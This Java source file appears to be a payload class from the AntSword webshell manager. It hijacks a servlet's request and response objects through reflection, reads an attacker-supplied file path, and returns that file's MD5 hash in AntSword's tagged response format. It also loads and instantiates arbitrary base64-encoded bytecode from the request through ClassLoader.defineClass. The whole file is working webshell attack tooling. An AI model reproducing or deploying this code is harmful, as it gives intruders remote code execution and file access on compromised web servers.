package filemanager;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Filehash {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder = "base64";
    public String cs = "antswordCharset";
    public String randomPrefix = "antswordrandomPrefix";
    public String decoderClassdata;
    private static final int STREAM_BUFFER_LENGTH = 1024;

    @Override
    public boolean equals(Object obj) {
        this.parseObj(obj);

        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargpath";
        String varkeydecoder = "antswordargdecoder";

        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = decode(request.getParameter(varkey1));
            this.decoderClassdata = decode(request.getParameter(varkeydecoder));
            output.append(FileHashCode(z1));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + this.asoutput(output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    public static MessageDigest getMd5Digest() {
        return getDigest("MD5");
    }

    public static MessageDigest getDigest(final String algorithm) {
        try {
            return MessageDigest.getInstance(algorithm);
        } catch (final NoSuchAlgorithmException e) {
            throw new IllegalArgumentException(e);
        }
    }

    public static byte[] digest(final MessageDigest messageDigest, final InputStream data) throws IOException {
        return updateDigest(messageDigest, data).digest();
    }

    public static MessageDigest updateDigest(final MessageDigest digest, final InputStream inputStream)
            throws IOException {
        final byte[] buffer = new byte[STREAM_BUFFER_LENGTH];
        int read = inputStream.read(buffer, 0, STREAM_BUFFER_LENGTH);

        while (read > -1) {
            digest.update(buffer, 0, read);
            read = inputStream.read(buffer, 0, STREAM_BUFFER_LENGTH);
        }
        return digest;
    }

    public static byte[] md5(final InputStream data) throws IOException {
        return digest(getMd5Digest(), data);
    }

    public static String md5Hex(final InputStream data) throws IOException {
        return encodeHex(md5(data));
    }

    static String encodeHex(byte[] bytes) {
        String h = "0123456789ABCDEF";
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (int i = 0; i < bytes.length; i++) {
            sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
            sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
        }
        return sb.toString();
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
        }
        if (encoder.equals("base64")) {
            return new String(this.Base64DecodeToByte(str), this.cs);
        }
        return str;
    }

    String FileHashCode(String filePath) throws Exception {
        String s = "";
        String md5s = md5Hex(new FileInputStream(filePath));
        s += "MD5\t" + md5s + "\n";
        return s;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) obj;
            request = (HttpServletRequest) data[0];
            response = (HttpServletResponse) data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                if (obj instanceof HttpServletRequest) {
                    request = (HttpServletRequest) obj;
                    try {
                        Field req = request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        response = (HttpServletResponse) resp.get(request2);
                    } catch (Exception ex) {
                        try {
                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception ignored) {

                        }
                    }
                }
            }
        }
    }

    public String asoutput(String str) {
        try {
            byte[] classBytes = Base64DecodeToByte(decoderClassdata);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
            return cc.getConstructor(String.class).newInstance(str).toString();
        } catch (Exception e) {
            return str;
        }
    }

    public byte[] Base64DecodeToByte(String str) {
        byte[] bt = null;
        String version = System.getProperty("java.version");
        try {
            if (version.compareTo("1.9") >= 0) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            } else {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            }
            return bt;
        } catch (Exception e) {
            return new byte[]{};
        }
    }
}
